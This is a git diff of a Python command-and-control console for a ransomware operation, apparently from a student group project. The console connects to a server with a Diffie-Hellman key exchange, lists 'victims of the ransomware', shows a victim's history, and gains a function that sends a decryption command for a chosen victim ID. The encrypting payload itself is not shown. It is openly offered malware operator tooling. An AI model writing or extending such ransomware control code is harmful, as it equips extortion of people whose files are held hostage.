@@ -9,9 +9,12 @@ import socket
 from utile import security
 import utile.configgetter as config
 from utile import message
+from utile import input as custom_input
 import pickle
 from utile.network import send_msg, recv_msg
 
+
+key = b''
 
 def print_menu():
     print('CONSOLE DE CONTRÔLE'
@@ -23,11 +26,14 @@ def print_menu():
 
 def main():
     """ Console de contrôle """
+    global key
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((config.get_ip("C:/Users/coren/PycharmProjects/UE14-1IS4-Groupe1/config.json"), config.get_port("C:/Users/coren/PycharmProjects/UE14-1IS4-Groupe1/config.json")))
     choix = None
     hasAsked = False
     key_f = security.diffie_hellman_recv_key(s)
+    key = key_f
+    l_id = []
     while choix != '4':
         print_menu()
         choix = input('Votre choix : ')
@@ -40,6 +46,7 @@ def main():
             print('LISTING DES VICTIMES DU RANSOMWARE\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
             print(data)
             print('\n')
+            l_id = data
         elif choix == '2':
             if hasAsked:
                 id = input('Merci de préciser un ID pour consulter l''historique : ')
@@ -50,8 +57,10 @@ def main():
             else:
                 print("ERREUR : Veuillez d'abord lister les victimes!")
         elif choix == '3':
-            # Todo Fill payload
-            print(fill_payload()+"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+            change_state(s, l_id)
+            data = recv_msg(s, key_f)
+            print(data)
+            print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
         elif choix == '4':
             r = message.close_connexion()
             send_msg(s, r, key_f)
@@ -61,8 +70,17 @@ def main():
     s.close()
 
 
-def fill_payload():
-    return 'Todo payload'
+def change_state(s_client, liste_id):
+    global key
+    if not liste_id:
+        print("ERREUR: Veuillez d'abord lister les victimes!")
+        return
+
+    print("DEMANDE DE DECHIFFREMENT")
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    id_victim = custom_input.get_int_between("ID de victime ", 1, len(liste_id))
+    msg = message.get_message("change_state", [id_victim])
+    send_msg(s_client, msg, key)
 
 
 if __name__ == '__main__':
